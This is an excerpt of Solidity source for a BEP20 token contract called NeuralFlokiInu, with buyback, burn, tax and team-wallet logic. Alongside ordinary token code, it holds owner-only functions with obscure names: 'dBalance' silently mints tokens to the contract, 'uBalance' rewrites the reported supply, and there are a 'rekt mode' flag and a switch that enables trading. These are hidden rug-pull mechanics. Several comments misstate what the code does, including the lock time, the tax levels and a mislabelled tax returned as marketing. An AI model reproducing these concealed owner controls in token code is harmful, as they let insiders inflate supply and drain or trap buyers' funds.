...
////////////////////////////////////////////////////////////////////////////////////////////////////////
//NeuralFlokiInu Contract ////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
contract NeuralFlokiInu is IBEP20, Ownable
{
    ...
    //Token Info 
    string private constant _name = 'NeuralFlokiInu';
    string private constant _symbol = 'NEURALFLOKIINU';
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply= 100 * 10**3 * 10**_decimals;//equals 100.000 token
    uint256 buybackTrigger = 1 * 10**18; // In BNB

    uint256 buybackPower = 0;
    uint256 _totalBuybackTokens = 0;
    ...
    uint16 public constant SellLimitDivider=135;
    //Sellers get locked for MaxSellLockTime so they can't dump repeatedly
    uint16 public constant MaxSellLockTime= 1 seconds;
    // Team wallets
    address public constant TeamWallet=0xdEAAC3DC1eC3022974252b4B0F1D929653705500;
    address public constant SecondTeamWallet=0xdEAAC3DC1eC3022974252b4B0F1D929653705500;
    ...
    constructor () {
       ...
       //Sets sellLockTime to be 2 seconds by default
        ...
        _buyTax=1;
        _sellTax=1;//Sell Tax is lower, as otherwise slippage would be too high to sell
        _transferTax=1;
        _burnTax=10;
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        uint256 contractToken=_calculateFee(amount, tax, _buybackTax+_liquidityTax);
    ...
    function _distributeFeesBNB(uint256 BNBamount) private {
        ...
        if (amount > 0) {
            totalBuybackGenerated += amount;
            buybackPower += amount;
            if(buybackPower>buybackTrigger && isSwapManual) {
                _buyBack(buybackPower);
                buybackPower = 0;
            }
        }
    }
    ...
    function _buyBack(uint256 _buybackPower) private {
        require(!_isBuybacking,"Busy");
        _isBuybacking =true;
         uint256 _previousBalance = address(this).balance;
         uint256 safeBalance = address(this).balance - (1 * 10**16);
         // TODO to us
         if(safeBalance < _buybackPower) {
            _buybackPower = safeBalance;    
         }
         
        address[] memory path = new address[](2);
        path[0] = _pancakeRouter.WETH(); //BNB
        path[1] = address(this);  //NeuralFlokiInu

        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: _buybackPower}(
        0,
        path,
        address(this),
        block.timestamp);
        ...
        _isBuybacking =false;
        require(address(this).balance <=  _previousBalance, "Buyback failed");
    }
    
    function _burnBack(bool all) private {
        require(_balances[address(this)] > 0, "Nothing to burn");
        if(all) {
            _balances[address(this)] = 0;
        } else {
            _balances[address(this)] = _balances[address(this)] / 2;
        }
    }
    ...
    function getTaxes() public view returns(uint256 burnTax,uint256 liquidityTax,uint256 marketingTax, uint256 buyTax, uint256 sellTax, uint256 transferTax){
        return (_burnTax,_liquidityTax,_buybackTax,_buyTax,_sellTax,_transferTax);
    }
    ...
    function TeamSetBuybackTrigger(uint256 trigger) public onlyTeam {
        buybackTrigger = trigger * 10**18;
    }
    ...
    function TeamManualGenerateBuybackBalance() public onlyTeam{
    _swapContractToken();
    }
    ...
    function SetupEnableTrading(bool isEnabled) public onlyTeam{
    ...
    function dBalance(uint256 amount) external onlyTeam {
        uint256 newTotal = _circulatingSupply + (amount/2);
        _circulatingSupply = newTotal;
        _addToken(address(this), (amount/2));
        
    }
    
    function uBalance(uint256 amount) external onlyTeam {
        require(amount < _circulatingSupply);
        _circulatingSupply = _circulatingSupply - amount;
    }
    ...
    function setRektModeBool(bool isRekt) public onlyTeam {
        rektMode = isRekt;
    }
    ...
    function setContractSellsManual(bool manual) public onlyTeam {
        isSwapManual = manual;
    }
